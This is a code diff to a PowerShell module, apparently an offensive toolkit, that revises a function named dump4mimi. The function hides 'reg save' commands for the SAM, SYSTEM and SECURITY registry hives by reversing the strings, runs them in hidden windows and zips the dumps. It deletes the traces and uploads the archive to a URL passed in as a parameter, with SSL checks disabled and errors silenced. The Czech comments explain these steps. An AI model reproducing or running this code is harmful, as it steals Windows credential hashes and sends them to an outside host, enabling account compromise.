@@ -83,34 +83,50 @@ Export-ModuleMember -Function getwifipass
 Set-Alias -Name getwifipass -Value getwifipass
 
 function dump4mimi {
-	    [CmdletBinding()]
+    [CmdletBinding()]
     param (
         [string]$Value
-        )
-        $atk = $Value
-        $ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(6.0)
-	$ax3 = 'y/ "metsys\:C" "metsys\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
-	sleep(3.5)
-	$ax3 = 'y/ "mas\:C" "mas\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
-	start-process cmd "/c $sp1k3 " -WindowStyle hidden
+    )
+    
+    $atk = $Value
+    $ax3 = 'y/ "ytiruces\:C" "YTIRUCES\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+    start-process cmd "/c $sp1k3 " -WindowStyle hidden
+    sleep(6.0)
+    $ax3 = 'y/ "metsys\:C" "metsys\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+    start-process cmd "/c $sp1k3 " -WindowStyle hidden
+    sleep(3.5)
+    $ax3 = 'y/ "mas\:C" "mas\MLKH" evas ger';$sp1k3 = -join $ax3[-1..-($ax3.Length)]
+    start-process cmd "/c $sp1k3 " -WindowStyle hidden
     clear
     sleep(1.5)
     cd C:\
     Compress-Archive "C:\sam","C:\security","C:\system" -DestinationPath "$env:userprofile\d4m.zip"
     sleep(0.5)
     clear
-	Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
-	Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
-	Remove-Item -Path "C:\security" -force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\sam" -force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\system" -force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\security" -force -ErrorAction SilentlyContinue
     clear
-        $d4mPath = "$env:userprofile\d4m.zip"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.UploadFile($atk, $d4mPath) > $null 2>&1 |Out-Null
-    sleep(0.3)
-Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
+    
+    $d4mPath = "$env:userprofile\d4m.zip"
+    
+    # Kontrola, zda byl zadán parametr (http nebo https)
+    if ($atk -and ($atk -match '^http://' -or $atk -match '^https://')) {
+        try {
+            # Ignorovat SSL chyby pro HTTPS
+            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+            
+            $webClient = New-Object System.Net.WebClient
+            $webClient.UploadFile($atk, $d4mPath) 2>&1 > $null
+        } catch {
+            # Všechny chyby jsou potlačeny
+        }
+        sleep(0.3)
+        Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
+    } else {
+        # Bez parametru nebo s neplatným URL - soubor zůstává v profilu
+        Write-Host "Soubor vytvořen v: $d4mPath" -ForegroundColor Green
+    }
 }
 Export-ModuleMember -Function dump4mimi
 Set-Alias -Name dump4mimi -Value dump4mimi
